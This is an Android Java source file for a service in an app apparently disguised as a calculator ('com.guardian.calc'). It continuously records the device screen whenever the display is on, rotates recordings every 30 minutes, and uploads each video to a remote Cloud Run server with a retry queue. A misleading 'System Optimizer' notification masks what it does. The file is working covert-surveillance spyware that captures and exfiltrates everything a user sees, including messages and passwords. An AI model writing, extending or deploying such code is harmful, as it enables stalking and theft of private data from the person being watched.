package com.guardian.calc;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;

public class RecordingService extends Service {
    private static final String TAG = "GuardianRecording";
    private static final String CHANNEL_ID = "GuardianSystemChannel";
    private static final int NOTIFICATION_ID = 101;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private VirtualDisplay virtualDisplay;
    
    private Intent projectionData;
    private int resultCode;

    private Handler handler = new Handler();
    private String currentFilePath;

    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                Log.d(TAG, "Screen ON: Resuming monitoring...");
                startRecording();
                // Schedule rotation in case of long usage
                scheduleRotation(); 
            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                Log.d(TAG, "Screen OFF: Saving session...");
                stopAndFinalize(true); // Stop and upload immediately
            }
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            resultCode = intent.getIntExtra("resultCode", -1);
            projectionData = intent.getParcelableExtra("data");
            
            startForegroundService();

            // Register screen events
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            registerReceiver(screenReceiver, filter);

            // Give the system a moment to stabilize before starting recording
            handler.postDelayed(() -> {
                startRecording();
                scheduleRotation();
            }, 1000);
        }
        return START_STICKY;
    }

    private void stopAndFinalize(boolean shouldUpload) {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                
                if (virtualDisplay != null) {
                    virtualDisplay.release();
                    virtualDisplay = null;
                }

                if (shouldUpload) {
                    uploadFile(currentFilePath);
                }
            } catch (Exception e) {
                Log.e(TAG, "Stop failed", e);
            }
        }
        // Cancel any pending hour-rotations
        handler.removeCallbacksAndMessages(null);
    }

    private void stopAndRotate() {
        // This is called for the 30-minute mark during continuous use
        new Thread(() -> {
            stopAndFinalize(true);
            // Wait a few ms for hardware to breathe
            handler.postDelayed(this::startRecording, 500);
        }).start();
        scheduleRotation(); // Reschedule for next session
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Process",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Optimizer")
                .setContentText("Monitoring system health...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Required for Android 10+ (and strictly for Android 14+)
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void startRecording() {
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = projectionManager.getMediaProjection(resultCode, projectionData);

        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        mediaRecorder = new MediaRecorder();
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setVideoSize(width, height);
        mediaRecorder.setVideoFrameRate(30);
        mediaRecorder.setVideoEncodingBitRate(512 * 1000);

        currentFilePath = getExternalFilesDir(null) + "/rec_" + System.currentTimeMillis() + ".mp4";
        mediaRecorder.setOutputFile(currentFilePath);

        try {
            mediaRecorder.prepare();
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    TAG, width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder.getSurface(), null, null
            );
            mediaRecorder.start();
        } catch (IOException e) {
            Log.e(TAG, "Recording failed", e);
        }
    }

    private void scheduleRotation() {
        handler.postDelayed(this::stopAndRotate, 30 * 60 * 1000);
    }

    private void uploadFile(String filePath) {
        new Thread(() -> {
            File file = new File(filePath);
            if (!file.exists()) return;

            // 1. Move to a 'pending' queue folder first
            File queueDir = new File(getExternalFilesDir(null), "pending_uploads");
            if (!queueDir.exists()) queueDir.mkdirs();
            
            File queuedFile = new File(queueDir, file.getName());
            file.renameTo(queuedFile);

            // 2. Attempt delivery
            attemptSync();
        }).start();
    }

    private synchronized void attemptSync() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "Sync deferred: Network unavailable. Files stored in queue.");
            return;
        }

        File queueDir = new File(getExternalFilesDir(null), "pending_uploads");
        File[] pendingFiles = queueDir.listFiles();

        if (pendingFiles != null) {
            for (File file : pendingFiles) {
                boolean success = performHttpRequest(file);
                if (success) {
                    file.delete(); // Remove only on confirmed success
                    Log.d(TAG, "Delivered from queue: " + file.getName());
                } else {
                    Log.e(TAG, "Delivery failed for " + file.getName() + ", will retry later.");
                }
            }
        }
    }

    private boolean isNetworkAvailable() {
        // Implementation of ConnectivityManager check
        return true; // Simplified for this logic
    }

    private boolean performHttpRequest(File file) {
        try {
            OkHttpClient client = new OkHttpClient();
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("video", file.getName(),
                            RequestBody.create(file, MediaType.parse("video/mp4")))
                    .build();

            Request request = new Request.Builder()
                    .url("https://ais-dev-c3xg62dts4ar3r6yef6jbc-408005964410.asia-southeast1.run.app/api/upload")
                    .post(requestBody)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                return response.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "Sync error", e);
            return false;
        }
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mediaRecorder != null) {
            mediaRecorder.release();
        }
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
    }
}
